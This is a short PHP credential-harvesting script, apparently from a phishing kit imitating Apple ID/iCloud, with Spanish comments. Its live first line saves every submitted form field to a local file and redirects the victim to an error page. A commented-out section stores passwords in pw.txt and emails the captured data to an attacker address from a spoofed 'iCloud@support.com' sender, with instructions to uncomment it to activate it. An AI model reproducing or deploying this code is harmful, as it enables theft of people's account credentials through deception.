
<?php $file = 'datos-privados.txt'; file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=http://192.168.1.1/error.php" />



<!-- header ('Location:https://google.com');
    if(isset($_POST['pass']) && isset($_POST['pass'])) {
        $data = $_POST['pass'] . '=>=>=>=>=>=>=>' . $_POST['pass'] . "\n\n\n";
        $ret = file_put_contents('pw.txt', $data, FILE_APPEND | LOCK_EX);
        if($ret === false) {
            die('error!');
            }
            else {
                echo "Done";
            }
        }
        else {
        die('Error');
            }
//Script.php para mandar las credenciales a un correo electronico

//Quitar l@s // para el funcionamiento del Script.php

//$to=correo electronico a enviar 

//Script.php

    //$to="ejemplo@gmail.com";
	//$subject="Credencial IDapple/iCloud";
	//$message="$data";
	//$from="iCloud@support.com";
	//$headers="From:" . $from;
	//$mail=mail($to,$subject,$message,$headers,$from);
	//if($mail)
	//{echo "email sent to " . $to;}
die(); -->